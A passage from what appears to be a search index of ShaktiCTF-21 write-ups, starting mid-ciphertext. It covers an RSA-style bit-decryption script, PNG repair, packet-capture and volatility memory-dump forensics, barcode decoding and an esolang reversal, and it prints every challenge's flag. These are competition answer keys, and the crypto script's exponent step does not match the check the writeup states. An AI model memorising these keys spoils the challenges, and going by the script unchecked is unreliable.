380155757610023881313542450314806157673664799112L, 19683776564375453605883964654879957698756254559L, 43383584999406070429416277350085499394109459126L, 144387263230719600281316819853134788477784762083L, 87949768501179906441288780703259946463864030018L, 431209645604478415485941369102530566991524490369L, 726222229627274684880162339685366010699968344905L, 112406592095148269917120485235753022005744988865L, 697437757471364977176040689280612791646014582160L, 288303739609623663737993183334403780500224944503L, 371441671537548617833261377684573395637718098377L, 73503179213393913023704937289223113070710436178L, 14278600014834517753559474524037832942635927659L, 95979312957862956641244586033112513755803077444L, 123611849060591463856666997035364759427112812349L, 250267505390780054373759212573794114332304420897L, 274331340187983766414970375369314382470309923528L, 530954278326398757599110590629998236194873705738L, 445063803639254844602118928332995402727991005526L, 477536316882356739806381795009989191971022494775L, 145806534277604580875808969952673951890456430994L, 338617094019005929131671762676393196161129291273L, 787986998792470243821397305866328174678704601832L, 797681956485293402755781130144373911193743174116L, 102568133699310747724426519505517138297342928702L, 485973235220253658819163335922664305614753222737L, 708864866282153909934399948843210933312918475225L, 308869644059764204860466118240550021785346378407L, 265134597784188972044817186771092475529959115280L, 658630862233825651846758771232193854753199783323L, 410299892119423701050427477155381392726923211285L, 6310556712134526086449137092667549852236480664L, 721490244153294996049060382571833870041784134677L, 189255620808066245253673434834382588149476325354L, 656660321216535035554868867584817446419376547800L, 227454614460719041137689443422767765867650838496L, 564044834979679073000283863743361202562615780677L, 819497725880056350642396338505462063661613081114L, 221608084786562734221253860081125113787049343286L, 65545019154510438233732307194863607751031185596L, 501764965357482269727888050687089193157839203155L, 12596049711442079696416208815415678242091492882L, 608335000655435283873776788164729624608624817344L, 769164412496263133567276017296030606229830101938L, 664392246067357098877579195261219487179986160723L, 75996028618380983622275289805057198859844565452L, 672253925254041921269524864028282672756772077887L, 10895374234330584911367787251440628566929185900L, 142938310359303082468235486875054184138048896491L, 580034759791051467570186991460531038900679165541L, 287969775416861410657459226277133443501613853261L, 283979020686970117242427425329619893769855354427L, 49347852309409910369201393348291141557656286601L, 624150486700256698789404049401551672419608893976L, 454233579238810112360216789636690941906069484L, 690476396562361518729054252655764072124449268089L, 364952245729150423326049996389508037748559889683L, 46898493332148283155094923745254689993163426686L, 721357617282368645994984755385188516191333854333L, 668358240156477324515019332670949254186522240400L, 530146560534258049207674282686131830473272127904L, 421240386903585887479293913607895739401770216131L, 131544157730297580532376112097192541317179941259L, 53769876913560242076228652083351431136553941165L, 324630132786079151774454244099857497319443044190L, 55914569733303855249647496460820458501426747612L, 356460015927961571935862199999992385930644898065L, 381970962369842965489276922281370450755149773458L, 377925988386382827724043815986127076122697666178L, 170391875451406681354914296500571079580495228122L, 500412216700342254882222529341044797546002378807L, 270482626136675206071126080144589222444978935258L, 510204515848361838813066544104229196649427634721L, 694801815446371547162777895975222045949858069418L, 739395372540171364253886631013817491306399454241L, 188905973397720824340314521621708188756348481623L, 487870658355564402820834450621197405413234278639L, 319933909357132234363354760423492914423939767405L, 263703052554121451143337156067968794709832976406L, 570885622346973806312331572767432345815012650994L, 613648216706507119609753855305736669966565489982L, 362055399017830857419118173194209585364129442109L, 464810998911591121288542168872550032794798575825L, 196427036821223400365200413058345761514591417071L, 25628609184402392719234409827173411591973261458L, 389660521648409036834014768969265025739038255604L, 384795004021400423555640099529367625348372390881L, 707289989717621963077194153935371259310016146498L, 670156226011236402401031750316704325477772529598L, 629478318010023990541972179492930924715945763382L, 420764775998999021307498556733386932841231547252L, 251295036637272900755099390296951302668662082535L, 169181615309865901082109507073231110967263343231L, 727702942882742898038421109217524091767497663579L, 83024833885016173065293040667506410015938527209L, 590299697981360913335337981554769685232278816484L, 839249169584760629344409812254395370637808942355L, 2532976737131698067709154159037178901016309877L, 827937908618358796220690459011146862691362111002L, 207856757362656702785928558342235732619155859448L, 769440512853837881195823544868309771285163168637L, 150792348186937950818307794770276348445131352633L, 406447664606606744239239241303236797113232638462L, 684929378565763960066686307141328078651822393408L, 224654949657621819479575791369530594184155735377L, 359668158337346821455429069306126150792495076312L, 426060019926904837328971794380434549817610220732L, 505900793827530726062521493253102791728579635544L, 574338323217068317021970616387654890577373082437L, 488642086812332277755648129901622844016014181036L, 782798139277588726443102861877502720631068154149L, 324941005837173666916146304702575016292154648894L, 599252796763371419729714377145026171271223602258L, 288626676593421098489763933781298880420148163084L, 467935558547944283971065855963398198551871488940L, 761714358296754159904539604281904852153669298518L, 276446988966064634125865380166049029609802351898L, 369023293814293814154164274667350587946664894323L, 717575431771607488393572799869825518074253493155L, 118574849771069306281658344868625779723252233598L, 12370452420955837433680686183877312882669690356L, 302301431161391687343955867699420163562587859945L, 195371671757690146983317782756160228746356628053L, 398747732493308984681571661499786666875939301584L, 698066685291591126425888078294753343383201876605L, 740615239592232339016993695884773933922478083470L, 106890365483452085129238401357149755728096568181L, 675424749894236876558905109629365681327887392939L, 201302679654677994076085404830210315546203833631L, 44180267617276864922134072223207783121823083760L, 124456735968311732522942481244765035866893530651L, 417097239834755904408684513793979044196227705274L, 233788505090359270398498540249276534994456393509L, 784883544295792169888524547442249976612414385390L, 263927032662315532641804497592590261948623275544L, 230408128635809022368695431658123209759525446197L, 828438163544123004635226007093619116738969501455L, 131177833362897071821531267320249645985720757061L, 282559114644612791250228142178864990076027445349L, 51535753100637770749762754865965551911906842650L, 75639553057595587596260623277885037750125179263L, 58473575929726038902167525004493155853338472174L, 644200156245117800830127150551293667263711884010L, 59336566770535954402402035001334688195109558183L, 325545043540004593614133895407411121346920176287L, 386730240555902975565127557492240699320716883276L, 107832757107482266991355321046790326277959386133L, 828353615833264639624534978723116154197590072611L, 437040243883858950708846625114604220964420978147L, 803398029066860857025331241486964965031131551855L, 576964537171426515123456361528143227570520116021L, 809583738378871906451344170063186991235371039023L, 823305093786540109619869220762083224118345164231L, 411621562624640152400201282326942360790677410663L, 231940523067486950068748404474658124358585742451L, 604140702068928167426636914613216363264491139925L, 182549530248750772516328059170083331367736115014L, 351272332765569839425323248007300819393087347081L, 808051965718020879122522501107824643411794084717L, 435313223797686028005157782836052182346489443562L, 773290097747317561689672554732697061093259735422L, 494807743119295726369579141007071491416325582655L, 374920928368387309057243128392752000439621200886L, 20308207759197365626061325015796899552114404367L, 219468272654429509419082815650800497195671108828L, 81139930848333886667752156803811140821451629059L, 569841453048534459795682040530849453115831698992L, 219815172001382756213076518296618693861215663555L, 315228832309928783802974983540753584930582247996L, 521351457638018908013070218723655643353193350239L, 837078355322582540009573068258668145024145790857L, 305949280410779965167795125684763760979096567656L, 752734535504843782529733381847990120498024803199L, 130979635848607595450001756874180120833056339272L, 127380462105684333862449267491349897546937670062L, 831464164576028236819157664155629321588853884506L, 458553646896923021292508986645409497433444903480L, 331547581789456197823262914448841887743389126588L, 687438850344432414366519941161325929797010982058L, 46814190784385113831609191671871870377062343969L, 367204250911005382086630700883675824898695572800L, 837950709225208622477048636848957743414279375406L, 755979086689398053301176627949234797669290978111L, 463929034563763591426239863240035335944307807918L, 388056079877348208051659258366423130180840108779L, 481802465454467461901032139782822670524640782774L, 701079443559078618728078108282845476374731501563L, 334745542222185197153180834408788144100538013756L, 253145560380270643162860828610515679311935720072L, 395630118318640218770711387893972244901063806635L, 208106342863019937023658673932614122363417212569L, 800934699010135610598225595151405276781918908874L, 696336112960889233518724992191716194527976985507L, 300286054927681941643313635323094504882574668063L, 458789329000502799100156566567758633503913820978L, 708175590579955723202930994812768283855064465047L, 587984734773590846183205937392451653174439236906L, 823762034931564176090815640023005894001280083927L, 524050296443714423381097945460586696978946512362L, 826146010460282803089280095111726046618296418403L, 738059115420803411392019151234924442822894137372L, 785923027603124246693527973036116119960741214026L, 252991902280292538077710740416727662292106903638L, 612730418549786530304086962840101299076730718334L, 69668983448626635123547735831825182040773807879L, 739161334792019562944848789255480347264595497250L, 426088326883952707470818191951397422806811512699L, 609894411725117311887748173369827266668614691266L, 165292756235797442318361854602140226544694739311L, 589667800107858677593289168022975113313550682848L, 640857564932560426034113458302923984027810983424L, 433295904246129548439611855874554726964056196739L, 295736828268442704674230280994652730936476162079L, 362750821004685893453136326523511170789437995781L, 589336117631319830914706810245178694288089137894L, 811399758747533046016039717227711274741061322838L, 27580861145202333471323495462147840357753419133L, 470227706417198698085667542317817787181959330535L, 584323275788057749480505550524460240732635160625L, 237827904233525417474165042101078126135986675291L, 185838249618402980174158400553291130995482918982L, 716717904900153456374864913024565035802728872046L, 299928293393029561935406197987330775735773835320L, 610584168172650199159224372380373439956634978704L, 690408099401618105598728398222166520124608190031L, 283306897206518288330461379029998212937266204548L, 817789019703352399202811822660012332372841442630L, 220127609791912011108106028754496869303560001849L, 246504269062014401534735358881601032162158759689L, 46082991319083955224175960690398710532164487906L, 212751399833511915627540175127168811177001660515L, 385250717564324096772476620548142926475688319557L, 61365581213548006550836975224755122334454850567L, 500463428035823554224310567250695080325995136096L, 61899143940365444140145428783315450062301530480L, 203025377470260666449657924180136421473514357156L, 123908476681846473673931773788947788317808065213L, 195215144275960912638932735284434043560100707418L, 133310257625037249927206630090100662665907910449L, 276367955374261543252723006408725695641217591135L, 663820798437396723050278496454824751706073882376L, 627376994406926072818386443662506537498856251729L, 807263912057381638138372982429348018327576023228L, 818554198814274015966753870605601199174333968563L, 529245620163810217622982543182351257311767464391L, 546398992629494812601212735149228626834119169658L, 788234766026477342751189473804919448998384347820L, 167271976519951808827353512125697808810338462380L, 430534784945777772222546078201421648977639348392L, 566978025835009408463135989978297395594607030631L, 727029425844280750981029116965799959144058594190L, 448139533138455217978527391597808802026293321469L, 151729712152759812390167470675728297857929105951L, 657791674324077339300884249739164923180072401180L, 424404948439217017610243837136383380191856871586L, 455777852150250746502732696760882431897002125490L, 118395806165479611207400242952156754708902219616L, 651998890970295878824168089404549122037582504955L, 318053786402730632110007904507392367956281607521L, 89256996994847882782731727353769430635891555271L, 191640633961245854939398057878203554179178922625L, 776093243824038694002940702752259227273873370266L, 604808053552832309560700585581226890424168461228L, 696457148711375718900956512475692076017562220382L, 225740711410466953926721086553814924866335860229L, 779384895686875556285208428413344125970531184120L, 80036196428413356900967644789298317424533638010L, 822496368697611448419908595847938425766407310386L, 834931499492006898642424172352707198872177553902L, 698414105277227047734122275193896168604649888702L, 529758554002809089081465457150468189507830589413L, 717258925424201058322126193594043182379350820121L, 545320778959010102117304312285631032420173177586L, 198810957950627600434822289656001469986862095348L, 396686025175354098156566844871532163846424230341L, 695402937231760183954791141361421552844300447983L, 616359789228266349699343794021003938187153822056L, 605577098887398262759634549331644256082166532624L, 601338707988632159208727568593686398013820974578L, 602334758345704224480697812073862084189082659829L, 199993895840217594422160437717413997273424537729L, 301172881601039569961892167965346000465469196938L, 270479627692150358469747722957892647453928511135L, 326335212710487507108472271822639699064648093691L, 106777921739243304370773085119576780949295942475L, 167071874552627084471353729657264563338026693956L, 197386913819707750998548688666241780705209642981L, 333989154944272765126437456969009498043248355518L, 434050250540343912275467215058298016032888176906L, 725401040393076792082841393446779306613460301273L, 727195206457435913302519991149583073712130944332L, 71590043050251237974379603651300783856190315391L, 793139264226788841507794442559678297202409093836L, 378525088022847526633162652098970409025974176857L, 64801404877308530110643631000410492805816851806L, 643972961663258149439837603423804897541649156072L, 157478292833194737519619595267874394324268309984L, 134041615706387295807480733390897871749463349268L, 461258613878623602622274059869770203247750228227L, 625872418231109115583561800171823884770612992316L, 237401566421194941434761956019939328673784029053L, 352405224268011659966413741974587740202212965590L, 116884396815801319245874245933296320636289143041L, 283195867540544834172532403440934521697373549015L, 689140484289234758370348531544928691906949176271L, 193196143026619464739760509606724898405753196236L, 67085710038260071732180539591066081368573964447L, 791794421731500760432508508849445876352096030071L, 432475128267108313460692996087695700599634295795L, 685073149783887985113269353340454247763263219124L, 335833908379012325847781848040473707739024530929L, 220612931303802409528417426553183475490460728373L, 291854819805074338140207394148645955031098744378L, 714515251507395673121930785122395634981321413798L, 724693143577584941911193410692637232099404458917L, 611243364076247112840263509691315114388391971369L, 229795860797995375715782537388782018888177477019L, 296341917462921514026327489596409707263895273191L, 309740425030881907897587814686626624055404447246L, 671631272527133996290893591609221360527257103885L, 218905811821960994832449103806857649781424376178L, 429772382896991457674660590568850053767362874075L, 250175727687874743892420590416583480995866963574L, 220396487416821216308222497372918137375558487785L, 248632603454655733234736595964105946950230116916L, 227496926861674027230311767436572791705586083714L, 519824104424885904393303337198605448578756909808L, 795103589371838503191297936262867047859443076904L, 244542828172213041199894799012547508435456165435L, 50052840614934527554894507145108176434868736721L, 539864968707154388655261925196382978215459738283L, 273582666961051735607824388845532732241288761719L, 531514886312313973773063924153516924192418657044L, 101484196383889500114457151515690119406749520478L, 404547795626034292311498435162286213193191412452L, 250171257240814875397420693184875445138996688633L, 211239841284623887225478944285253370693514862872L, 33702581727268200448000963472643896415286212021L, 727954030308555513888383002365701074524660686267L, 296372634680510180045698528854832499158025138767L, 103639178450743820451116640692980921644914754181L, 381056138816946574321553076345557659912184128071L, 220363775860108926430412133120609969043172885719L, 828380089804826191248904060499310291984337292267L, 240818837128375459115613365004393187326689178106L, 599714327776873507299886356592570412302353344127L, 514039904560736346483340269688580936191901954975L, 838405528426499141475985982949569190893885957871L, 67178744880390923276819786579857611880328181620L, 821336351518183360948635849459228489892497850605L, 465122017037822859400169939428274438908366165072L, 95264823246420773240792527458136208743710928871L, 158144519740001444337707734860202573635872827543L, 689985808396255471137327738486051869204812470986L, 550134662580703482270292485064392354509835320583L] Each bit is encrypted using unknown numbers, except the modulus. But, on checking the modulus, one can find that it is factorizable . Next step is to question if one can find which bit is being encrypted. For that, we need to check: pow(ct[i],phin//5,n) == 1 #this tells that the bit encrypted is 0 else 1 Solution Script: from Crypto.Util.number import * n = 839647959743379757835423741637185376972991646369 p,q = 716158806799958648435521, 1172432638921544069685089 f = open('ciphertext.txt').read() L = eval(f) #FYI: This is a dangerous function :P pt = \"\" for i in L: phi = (p-1)*(q-1) d = (phi*inverse(5,n))%n if (pow(i,d,n) == 1): pt = pt + '0' else: pt = pt + '1' print long_to_bytes(int(pt,2)) Flag: shaktictf{Awesome!!YouAreANumberTheoryExpert!!KeepGoing}","title":"bitgame"},{"location":"ShaktiCTF21/crypto/intro/","text":"Cryptography Introduction \"The following repo contains writeups of challenges created for ShaktiCTF-21\" The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted. ShaktiCTF bitgame - Sowmya Awesome Encryption Scheme - Sowmya","title":"Cryptography"},{"location":"ShaktiCTF21/crypto/intro/#cryptography","text":"","title":"Cryptography"},{"location":"ShaktiCTF21/crypto/intro/#introduction","text":"\"The following repo contains writeups of challenges created for ShaktiCTF-21\"","title":"Introduction"},{"location":"ShaktiCTF21/crypto/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted. ShaktiCTF bitgame - Sowmya Awesome Encryption Scheme - Sowmya","title":"The contents of this repo"},{"location":"ShaktiCTF21/forensics/chunkies/","text":"Chunkies Challenge Description We could only retrieve only this file from the machine, but looks like this is corrupted. Can you recover the file? Challenge Author v1Ru5 Short Writeup The given PNG file is corrupted. Correct the header of the image. Fix IDAT and IEND chunks. On using the tool 'pngcheck' on the image, we see that there is a CRC error which can be directly corrected. Flag shaktictf{Y4YyyyY_y0u_g0t_1T}","title":"Chunkies"},{"location":"ShaktiCTF21/forensics/chunkies/#chunkies","text":"","title":"Chunkies"},{"location":"ShaktiCTF21/forensics/chunkies/#challenge-description","text":"We could only retrieve only this file from the machine, but looks like this is corrupted. Can you recover the file?","title":"Challenge Description"},{"location":"ShaktiCTF21/forensics/chunkies/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF21/forensics/chunkies/#short-writeup","text":"The given PNG file is corrupted. Correct the header of the image. Fix IDAT and IEND chunks. On using the tool 'pngcheck' on the image, we see that there is a CRC error which can be directly corrected.","title":"Short Writeup"},{"location":"ShaktiCTF21/forensics/chunkies/#flag","text":"shaktictf{Y4YyyyY_y0u_g0t_1T}","title":"Flag"},{"location":"ShaktiCTF21/forensics/delete/","text":"Delete Challenge Description Sometimes what you see is not always true... Challenge Author v1Ru5 Short Writeup When we use any hex editor, we find that there are two PNG headers. Removing the bytes before the second PNG header gives us the flag. Flag shaktictf{Y0u_4R3_aM4z1nG!!!!}","title":"Delete"},{"location":"ShaktiCTF21/forensics/delete/#delete","text":"","title":"Delete"},{"location":"ShaktiCTF21/forensics/delete/#challenge-description","text":"Sometimes what you see is not always true...","title":"Challenge Description"},{"location":"ShaktiCTF21/forensics/delete/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF21/forensics/delete/#short-writeup","text":"When we use any hex editor, we find that there are two PNG headers. Removing the bytes before the second PNG header gives us the flag.","title":"Short Writeup"},{"location":"ShaktiCTF21/forensics/delete/#flag","text":"shaktictf{Y0u_4R3_aM4z1nG!!!!}","title":"Flag"},{"location":"ShaktiCTF21/forensics/find/","text":"Find Me Challenge Description We found that there was a secret communication between two criminals. Can you find out the secret information? Challenge Author v1Ru5 Short Writeup Following up the TCP stream gives us this: 98 106 66 48 100 71 103 48 100 71 86 104 78 88 107 61 On converting the numbers from decimal to ASCII gives us 'bjB0dGg0dGVhNXk=' which when base64 decoded gives 'n0tth4tea5y'. The second TCP stream gives us a reversed zip file which after reversing back and using 'n0tth4tea5y' as the password gives us flag.txt. Flag shaktictf{g00d_lUcK_4_tH3_n3xT_cH411eNg3}","title":"Find Me"},{"location":"ShaktiCTF21/forensics/find/#find-me","text":"","title":"Find Me"},{"location":"ShaktiCTF21/forensics/find/#challenge-description","text":"We found that there was a secret communication between two criminals. Can you find out the secret information?","title":"Challenge Description"},{"location":"ShaktiCTF21/forensics/find/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF21/forensics/find/#short-writeup","text":"Following up the TCP stream gives us this: 98 106 66 48 100 71 103 48 100 71 86 104 78 88 107 61 On converting the numbers from decimal to ASCII gives us 'bjB0dGg0dGVhNXk=' which when base64 decoded gives 'n0tth4tea5y'. The second TCP stream gives us a reversed zip file which after reversing back and using 'n0tth4tea5y' as the password gives us flag.txt.","title":"Short Writeup"},{"location":"ShaktiCTF21/forensics/find/#flag","text":"shaktictf{g00d_lUcK_4_tH3_n3xT_cH411eNg3}","title":"Flag"},{"location":"ShaktiCTF21/forensics/follow/","text":"Follow Up Challenge Description We got a clue from one of our investigators that an interesting secret was transferred in our network. Help us find out the secret. Challenge Author v1Ru5 Short Writeup Just follow up the TCP stream to get the links for pastebin. The last link contains the real flag. Flag shaktictf{Th15_w4s_eA5Y!!}","title":"Follow Up"},{"location":"ShaktiCTF21/forensics/follow/#follow-up","text":"","title":"Follow Up"},{"location":"ShaktiCTF21/forensics/follow/#challenge-description","text":"We got a clue from one of our investigators that an interesting secret was transferred in our network. Help us find out the secret.","title":"Challenge Description"},{"location":"ShaktiCTF21/forensics/follow/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF21/forensics/follow/#short-writeup","text":"Just follow up the TCP stream to get the links for pastebin. The last link contains the real flag.","title":"Short Writeup"},{"location":"ShaktiCTF21/forensics/follow/#flag","text":"shaktictf{Th15_w4s_eA5Y!!}","title":"Flag"},{"location":"ShaktiCTF21/forensics/help/","text":"Help Me Challenge Description Our department had taken up the responsibility of solving a mysterious case but unfortunately our system crashed. We could only recover this memory dump. Your job is get all the important files from the system and use the files to find out the secret informatiom. Challenge Author v1Ru5 & bl4ck_Widw Short Writeup We use the tool 'volatility' for this challenge. This command gives us the first part. volatility -f Challenge.vmem --profile=Win7SP1x64 cmdscan Which on base64 decoded gives us 'shaktictf{H0p3'. volatility -f Challenge.vmem --profile=Win7SP1x64 filescan shows that there are two useful files Part II.png and L4ST.py.zip. Extract both the files. Apply 'zsteg' on the PNG image and we got the second part of the flag \" y0U_l1k3d \". The zip file has a python script which needs to be reversed. def tryin(text,s): result = \"\" for i in range(len(text)): char = text[i] if(char.isnumeric()): result+=(chr(ord(char)+1)) elif(char.isupper()): result += chr((ord(char) - s-65) % 26 + 65) else: result+=(chr(ord(char)^1)) return result def checkin(inp): for i in range(len(inp)): if(len(inp)<=7): Z.append(chr(ord(inp[i])-i+1)) else: Z.append(chr(ord(inp[i])-4)) return(''.join(Z)) # Giving the input \"y>v<^xd::439064..y\" as the string from the challenge , gives us our input to be used: X=\"uh27bio:uY<xrA.\" s=4 y=[] Z=[] Y=[] k=[] X=checkin(X) y=tryin(X,s) print(\"input: \"+y) which gives the last part of the flag \"th15_ch4lL3ng3!}\" Flag shaktictf{H0p3_y0U_l1k3d_th15_ch4lL3ng3!}","title":"Help Me"},{"location":"ShaktiCTF21/forensics/help/#help-me","text":"","title":"Help Me"},{"location":"ShaktiCTF21/forensics/help/#challenge-description","text":"Our department had taken up the responsibility of solving a mysterious case but unfortunately our system crashed. We could only recover this memory dump. Your job is get all the important files from the system and use the files to find out the secret informatiom.","title":"Challenge Description"},{"location":"ShaktiCTF21/forensics/help/#challenge-author","text":"v1Ru5 & bl4ck_Widw","title":"Challenge Author"},{"location":"ShaktiCTF21/forensics/help/#short-writeup","text":"We use the tool 'volatility' for this challenge. This command gives us the first part. volatility -f Challenge.vmem --profile=Win7SP1x64 cmdscan Which on base64 decoded gives us 'shaktictf{H0p3'. volatility -f Challenge.vmem --profile=Win7SP1x64 filescan shows that there are two useful files Part II.png and L4ST.py.zip. Extract both the files. Apply 'zsteg' on the PNG image and we got the second part of the flag \" y0U_l1k3d \". The zip file has a python script which needs to be reversed. def tryin(text,s): result = \"\" for i in range(len(text)): char = text[i] if(char.isnumeric()): result+=(chr(ord(char)+1)) elif(char.isupper()): result += chr((ord(char) - s-65) % 26 + 65) else: result+=(chr(ord(char)^1)) return result def checkin(inp): for i in range(len(inp)): if(len(inp)<=7): Z.append(chr(ord(inp[i])-i+1)) else: Z.append(chr(ord(inp[i])-4)) return(''.join(Z)) # Giving the input \"y>v<^xd::439064..y\" as the string from the challenge , gives us our input to be used: X=\"uh27bio:uY<xrA.\" s=4 y=[] Z=[] Y=[] k=[] X=checkin(X) y=tryin(X,s) print(\"input: \"+y) which gives the last part of the flag \"th15_ch4lL3ng3!}\"","title":"Short Writeup"},{"location":"ShaktiCTF21/forensics/help/#flag","text":"shaktictf{H0p3_y0U_l1k3d_th15_ch4lL3ng3!}","title":"Flag"},{"location":"ShaktiCTF21/forensics/intro/","text":"Forensics Challenge Name Level Author Concept Follow Up Very Easy v1Ru5 Network Delete Easy v1Ru5 File Chunkies Easy v1Ru5 File Find Me Medium v1Ru5 Network Help Me Hard v1Ru5 & Memory bl4ck_Widw","title":"Forensics"},{"location":"ShaktiCTF21/forensics/intro/#forensics","text":"Challenge Name Level Author Concept Follow Up Very Easy v1Ru5 Network Delete Easy v1Ru5 File Chunkies Easy v1Ru5 File Find Me Medium v1Ru5 Network Help Me Hard v1Ru5 & Memory bl4ck_Widw","title":"Forensics"},{"location":"ShaktiCTF21/misc/decodeit/","text":"decodeit Points : 100 Challenge description DECODE IT! Author bl4ck_Widw Writeup: use zbarimg to decode . flag =shaktictf{N1C3_w0rK_Fr13nD}","title":"decodeit"},{"location":"ShaktiCTF21/misc/decodeit/#decodeit","text":"","title":"decodeit"},{"location":"ShaktiCTF21/misc/decodeit/#points-100","text":"","title":"Points : 100"},{"location":"ShaktiCTF21/misc/decodeit/#challenge-description","text":"DECODE IT!","title":"Challenge description"},{"location":"ShaktiCTF21/misc/decodeit/#author","text":"bl4ck_Widw","title":"Author"},{"location":"ShaktiCTF21/misc/decodeit/#writeup","text":"use zbarimg to decode . flag =shaktictf{N1C3_w0rK_Fr13nD}","title":"Writeup:"},{"location":"ShaktiCTF21/misc/grocery/","text":"Grocery List Writeup This challenge was based on an esolang programming language(Grocery List) as the challenge name suggested. First decode the Base64 string given: ```Reverse GroceryPlace vichyssoise mango vermouth zucotto sandwich lamb veal yogurt vermicelli zucchini salmon fennel seeds ice cream carrots unagi inca berries cabbage upma grapes naan apples bananas almonds basil fenugreek potatoes pie soy beans eggs tunafish Find the input to the following output. OUTPUT: 4cum77itQdKy4r7c~rm5u05plN``` After decoding, it says that some input is passed to the grocery list given and we receive an output for that. This suggests that this talks about some kind of a program. On googling we find an esolang Grocery List The language is based on stack operations. So here is an interpretation of the first interation of the code. 1 mango vermouth zucotto sandwich``` Fist item starting with a `v` is skipped and ascii of the first letter of next item is pushed. So 109 is pushed to the stack. ```109 <-TOP/BOTTOM``` Similarly next item starts with a v, so it's ignored and ascii of the following item is taken. Pushed ascii value of `z` to the stack. ```109 <-BOTTOM 122 <-TOP``` The last line here starts with an s which first pop top two values and then subtacts second to top from top.This pushes 13 onto the stack ```13 <-TOP/BOTTOM``` **2** ```lamb veal yogurt vermicelli zucchini salmon fennel seeds Starts a loop. Then pushes 1 onto the stack(as shown in previous step) 13 <-BOTTOM 1 <-TOP The last line starts with an f and interchanges the top two values of stack. 1 <-BOTTOM 13 <-TOP 3 ice cream carrots unagi inca berries cabbage upma Takes and input and pushes it's ascii to the stack. Let's say first input is a . 1 <-BOTTOM 13 97 <-TOP Next, item starts with c arrots, so it duplicates value on top. And then the next item starting with u brings the value on top of the stack to BOTTOM 97 <-BOTTOM 1 13 97 <-TOP Similary next item i nca berries does the same as above. Let's say the second input is b After the next 3 operations: 98 <-BOTTOM 97 1 13 97 98 <-TOP 4 naan apples bananas almonds basil``` Next item starting with `g` works like an if statement. Looking here, TOP > second-to-TOP. Hence pushed 1 onto stack. And then pushes 4. (from `n`) And then pops top two and adds. ```98 <-BOTTOM 97 1 13 5 <-TOP``` Next item `b`ananas brings value from bottom of stack to top. And then add top two after popping and then push the result. And finally brings the other input from bottom of stack ```1 <-BOTTOM 13 103 97 <-TOP``` **5** ```fenugreek potatoes pie soy beans eggs tunafish``` Interchange the op two value of stack (`f`) Pop and print the top. (`p`) Pop and print the top again. (`p`) We see here that our second input is the one that will be changed each time. ```1 <-BOTTOM 13 <-TOP``` ```Printed: ga``` Next item `s`oy beans, subtract top two values. `e` checks for an end for the loop. So here we understand that, the loop is running 13 times. Hence 26 characters. ```12 <-TOP/BOTTOM``` ## Solution ```python a = \"4cum77itQdKy4r7c~rm5u05plN\" o = \"\" for i in range(0,26,2): if((ord(a[i]) - 5) > ord(a[i+1])): o = o + a[i+1] o = o + chr(ord(a[i]) - 5) else: o = o + a[i+1] o = o + chr(ord(a[i]) - 4) Flag shaktictf{c0mp73tedMyGr0c3ry5h0pp1Ng}","title":"Grocery List"},{"location":"ShaktiCTF21/misc/grocery/#grocery-list","text":"","title":"Grocery List"},{"location":"ShaktiCTF21/misc/grocery/#writeup","text":"This challenge was based on an esolang programming language(Grocery List) as the challenge name suggested. First decode the Base64 string given: ```Reverse GroceryPlace vichyssoise mango vermouth zucotto sandwich lamb veal yogurt vermicelli zucchini salmon fennel seeds ice cream carrots unagi inca berries cabbage upma grapes naan apples bananas almonds basil fenugreek potatoes pie soy beans eggs tunafish Find the input to the following output. OUTPUT: 4cum77itQdKy4r7c~rm5u05plN``` After decoding, it says that some input is passed to the grocery list given and we receive an output for that. This suggests that this talks about some kind of a program. On googling we find an esolang Grocery List The language is based on stack operations. So here is an interpretation of the first interation of the code. 1 mango vermouth zucotto sandwich``` Fist item starting with a `v` is skipped and ascii of the first letter of next item is pushed. So 109 is pushed to the stack. ```109 <-TOP/BOTTOM``` Similarly next item starts with a v, so it's ignored and ascii of the following item is taken. Pushed ascii value of `z` to the stack. ```109 <-BOTTOM 122 <-TOP``` The last line here starts with an s which first pop top two values and then subtacts second to top from top.This pushes 13 onto the stack ```13 <-TOP/BOTTOM``` **2** ```lamb veal yogurt vermicelli zucchini salmon fennel seeds Starts a loop. Then pushes 1 onto the stack(as shown in previous step) 13 <-BOTTOM 1 <-TOP The last line starts with an f and interchanges the top two values of stack. 1 <-BOTTOM 13 <-TOP 3 ice cream carrots unagi inca berries cabbage upma Takes and input and pushes it's ascii to the stack. Let's say first input is a . 1 <-BOTTOM 13 97 <-TOP Next, item starts with c arrots, so it duplicates value on top. And then the next item starting with u brings the value on top of the stack to BOTTOM 97 <-BOTTOM 1 13 97 <-TOP Similary next item i nca berries does the same as above. Let's say the second input is b After the next 3 operations: 98 <-BOTTOM 97 1 13 97 98 <-TOP 4 naan apples bananas almonds basil``` Next item starting with `g` works like an if statement. Looking here, TOP > second-to-TOP. Hence pushed 1 onto stack. And then pushes 4. (from `n`) And then pops top two and adds. ```98 <-BOTTOM 97 1 13 5 <-TOP``` Next item `b`ananas brings value from bottom of stack to top. And then add top two after popping and then push the result. And finally brings the other input from bottom of stack ```1 <-BOTTOM 13 103 97 <-TOP``` **5** ```fenugreek potatoes pie soy beans eggs tunafish``` Interchange the op two value of stack (`f`) Pop and print the top. (`p`) Pop and print the top again. (`p`) We see here that our second input is the one that will be changed each time. ```1 <-BOTTOM 13 <-TOP``` ```Printed: ga``` Next item `s`oy beans, subtract top two values. `e` checks for an end for the loop. So here we understand that, the loop is running 13 times. Hence 26 characters. ```12 <-TOP/BOTTOM``` ## Solution ```python a = \"4cum77itQdKy4r7c~rm5u05plN\" o = \"\" for i in range(0,26,2): if((ord(a[i]) - 5) > ord(a[i+1])): o = o + a[i+1] o = o + chr(ord(a[i]) - 5) else: o = o + a[i+1] o = o + chr(ord(a[i]) - 4)","title":"Writeup"},{"location":"ShaktiCTF21/misc/grocery/#flag","text":"shaktictf{c0mp73tedMyGr0c3ry5h0pp1Ng}","title":"Flag"},{"location":"ShaktiCTF21/misc/intro/","text":"Misc Challenge Name Level Author Concept decodeit easy bl4ck_Widw barcode Grocery List medium imm0rt4l_5t4rk esolang","title":"Misc"},{"location":"ShaktiCTF21/misc/intro/#misc","text":"Challenge Name Level Author Concept decodeit easy bl4ck_Widw barcode Grocery List medium imm0rt4l_5t4rk 